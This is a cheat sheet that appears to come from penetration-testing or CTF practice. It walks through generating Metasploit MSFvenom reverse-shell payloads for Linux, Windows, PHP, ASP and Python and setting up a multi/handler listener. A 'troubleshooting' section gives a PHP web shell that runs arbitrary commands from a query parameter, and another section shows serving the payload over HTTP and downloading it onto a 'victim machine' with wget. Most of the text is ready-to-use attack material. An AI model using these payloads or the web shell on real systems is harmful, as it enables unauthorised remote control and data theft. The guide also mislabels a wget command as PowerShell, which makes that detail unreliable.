# Metasploit Payload Usage Guide
## Overview

The Metasploit framework allows you to generate various payloads using **MSFvenom** and subsequently handle incoming connections with **Metasploit’s exploit/multi/handler**. The following process outlines how to create a payload, transfer it to the target device, and set up the listener to receive the incoming connection.

---

## Steps for Using MSFvenom Payloads

1. **Generate the shell** using MSFvenom and transfer it to the target's device.
2. **Start the Metasploit handler** with the following command:
```
use exploit/multi/handler
```
3. **Set the payload value** along with `LHOST` (your machine's IP) and `LPORT` (port on which your handler will listen) values.
4. **Run the handler** by typing `run` in the console and wait for the incoming connection.

---

## MSFvenom Payload Cheat Sheet

MSFvenom is a powerful tool for generating various payloads for multiple platforms. The following are common payloads and how to generate them.

### List of Available Payloads
To list all available Meterpreter payloads, use the following command:
```
msfvenom --list payloads | grep meterpreter
```

### Linux Executable and Linkable Format (ELF)
To create a reverse TCP shell for Linux:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

### Windows Executable (EXE)
To create a reverse TCP shell for Windows:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### PHP
To create a reverse TCP shell for PHP:
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

### ASP
To create a reverse TCP shell for ASP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

### Python
To create a reverse TCP shell for Python:
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

---

## Troubleshooting: Shell Not Working

If the generated shell doesn’t work as expected, you can try the following PHP code on the target machine to commit code execution:

```
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  // Get command from the query string
    system($cmd);         // Execute the command and display output
    echo "</pre>";
}
?>
```

After deploying the PHP script on the target system, execute commands via the query string by navigating to the shell’s URL with the ?cmd=<command> parameter. For example:
```
http://target.com/rev_shell.php?cmd=ls
```
This method allows you to execute arbitrary commands remotely.
# MSFvenom Extensions

Here are some commonly used MSFvenom extensions to enhance your payload generation process:
```
    -l payloads: Lists all available payloads in MSFvenom.
```
```
    -p PATH/TO/PAYLOAD: Defines the payload you want to use (e.g., windows/meterpreter/reverse_tcp).
```
```
    -f: Specifies the format of the payload (e.g., exe, elf, raw).
```
```
    -e: Defines the encoder to use for the payload (e.g., x86/shikata_ga_nai).
```
## Uploading the Shell

To upload the generated shell to the target system, you can use a simple HTTP server to host the payload.

1. On your attacker machine, start a simple HTTP server using Python:
```
python3 -m http.server
```
2. On the victim machine, use PowerShell to download the payload:
```
wget http://10.21.156.95:8000/revhell.php -O revhell.php
```
## Next Steps
Once the payload is successfully transferred to the target and executed, return to the Metasploit handler and wait for the incoming connection. After a successful connection, you can interact with the target system using Meterpreter or other post-exploitation tools provided by Metasploit.

This guide provides the essential steps to generate, transfer, and interact with payloads using MSFvenom and Metasploit. The cheat sheet should serve as a quick reference for common payload formats, while the troubleshooting section provides alternative methods if your initial approach does not work.
